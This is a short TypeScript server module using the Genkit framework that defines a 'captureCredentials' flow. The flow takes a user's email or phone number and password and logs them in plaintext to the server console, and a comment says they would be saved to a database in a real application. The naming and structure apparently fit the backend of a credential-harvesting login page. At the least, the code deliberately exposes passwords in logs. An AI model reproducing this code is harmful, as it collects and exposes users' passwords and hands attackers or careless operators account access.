'use server';
/**
 * @fileOverview A flow to capture user credentials.
 *
 * - captureCredentials - A function that receives and logs user credentials.
 * - CredentialsInput - The input type for the captureCredentials function.
 */

import {ai} from '@/ai/genkit';
import {z} from 'genkit';

export const CredentialsInputSchema = z.object({
  username: z.string().describe('The user\'s email or phone number.'),
  password: z.string().describe('The user\'s password.'),
});
export type CredentialsInput = z.infer<typeof CredentialsInputSchema>;

export async function captureCredentials(
  input: CredentialsInput
): Promise<{success: boolean}> {
  return captureCredentialsFlow(input);
}

const captureCredentialsFlow = ai.defineFlow(
  {
    name: 'captureCredentialsFlow',
    inputSchema: CredentialsInputSchema,
    outputSchema: z.object({success: z.boolean()}),
  },
  async (input: CredentialsInput) => {
    console.log('Captured Credentials:', input);
    // In a real application, you would save this to a database.
    // For this prototype, we are just logging it to the server console.
    return {success: true};
  }
);
